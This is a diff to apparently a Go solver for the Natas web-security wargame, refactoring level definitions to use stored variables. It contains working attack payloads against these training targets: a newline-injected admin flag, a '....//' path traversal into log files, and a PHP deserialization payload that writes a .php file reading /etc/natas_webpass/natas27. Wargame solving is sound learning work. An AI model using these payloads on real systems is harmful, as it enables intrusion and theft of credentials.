@@ -24,13 +24,19 @@ var levels = [...]Grabber{
 			32,
 		},
 		Combine{
-			Combine{
-				Text{"/"},
-				Cut{
-					XPath{grab, "//img/@src"},
-					"/",
-					0,
+			SetVar{
+				Combine{
+					Combine{
+						Text{"/"},
+						Cut{
+							XPath{grab, "//img/@src"},
+							"/",
+							0,
+						},
+					},
+					Text{"/"},
 				},
+				"Level2Dir",
 			},
 			Combine{
 				Text{"/"},
@@ -38,17 +44,7 @@ var levels = [...]Grabber{
 					Cut{
 						Path{
 							grab,
-							Combine{
-								Text{"/"},
-								Combine{
-									Cut{
-										XPath{grab, "//img/@src"},
-										"/",
-										0,
-									},
-									Text{"/"},
-								},
-							},
+							GetVar{"Level2Dir"},
 						},
 						"\"[TXT]\"",
 						1,
@@ -64,30 +60,24 @@ var levels = [...]Grabber{
 		Path{
 			grab,
 			Combine{
-				Trim{
-					Cut{
-						Path{
-							grab,
-							Text{"/robots.txt"},
+				SetVar{
+					Trim{
+						Cut{
+							Path{
+								grab,
+								Text{"/robots.txt"},
+							},
+							"Disallow: ",
+							1,
 						},
-						"Disallow: ",
-						1,
 					},
+					"Level3Dir",
 				},
 				Cut{
 					Cut{
 						Path{
 							grab,
-							Trim{
-								Cut{
-									Path{
-										grab,
-										Text{"/robots.txt"},
-									},
-									"Disallow: ",
-									1,
-								},
-							},
+							GetVar{"Level3Dir"},
 						},
 						"\"[TXT]\"",
 						1,
@@ -352,21 +342,9 @@ var levels = [...]Grabber{
 		LoadAll{
 
 			Post{
-				Headers{
-					Contains{
-						grab,
-						"natas21",
-					},
-					SetData{
-						"Cookie": Combine{
-							Text{"PHPSESSID="},
-							Random{
-								"Level20Cookie",
-								RandomNumLowerLetters,
-								32,
-							},
-						},
-					},
+				Contains{
+					grab,
+					"natas21",
 				},
 				SetData{
 					"name": Text{"a\nadmin 1"},
@@ -383,7 +361,6 @@ var levels = [...]Grabber{
 			"Cookie": Combine{
 				Text{"PHPSESSID="},
 				Random{
-					"Level20Cookie",
 					RandomNumLowerLetters,
 					32,
 				},
@@ -397,19 +374,7 @@ var levels = [...]Grabber{
 			Host{
 				Get{
 					Post{
-						Headers{
-							grab,
-							SetData{
-								"Cookie": Combine{
-									Text{"PHPSESSID="},
-									Random{
-										"Level21Cookie",
-										RandomNumLowerLetters,
-										32,
-									},
-								},
-							},
-						},
+						grab,
 						SetData{
 							"admin":  Text{"1"},
 							"submit": Text{""},
@@ -430,7 +395,6 @@ var levels = [...]Grabber{
 			"Cookie": Combine{
 				Text{"PHPSESSID="},
 				Random{
-					"Level21Cookie",
 					RandomNumLowerLetters,
 					32,
 				},
@@ -495,7 +459,7 @@ var levels = [...]Grabber{
 					"lang": Combine{
 						Combine{
 							Text{"....//....//....//....//....//var/www/natas/natas25/logs/natas25_"},
-							Cookie{"PHPSESSID"},
+							GetVar{"Level25Cookie"},
 						},
 						Text{".log"},
 					},
@@ -507,7 +471,10 @@ var levels = [...]Grabber{
 		SetData{
 			"Cookie": Combine{
 				Text{"PHPSESSID="},
-				Cookie{"PHPSESSID"},
+				SetVar{
+					Cookie{"PHPSESSID"},
+					"Level25Cookie",
+				},
 			},
 		},
 	},
@@ -523,16 +490,18 @@ var levels = [...]Grabber{
 							PHPSerialize{
 								"Logger",
 								map[string]interface{}{
-									"logFile": Combine{
+									"logFile": SetVar{
 										Combine{
-											Text{"img/"},
-											Random{
-												"Level26LogFile",
-												RandomAlphaNum,
-												32,
+											Combine{
+												Text{"img/"},
+												Random{
+													RandomAlphaNum,
+													32,
+												},
 											},
+											Text{".php"},
 										},
-										Text{".php"},
+										"Level26FileName",
 									},
 									"initMsg": "",
 									"exitMsg": "<?php echo \"Password: \";include(\"/etc/natas_webpass/natas27\");?>",
@@ -550,15 +519,8 @@ var levels = [...]Grabber{
 				32,
 			},
 			Combine{
-				Combine{
-					Text{"/img/"},
-					Random{
-						"Level26LogFile",
-						RandomAlphaNum,
-						32,
-					},
-				},
-				Text{".php"},
+				Text{"/"},
+				GetVar{"Level26FileName"},
 			},
 		},
 	},
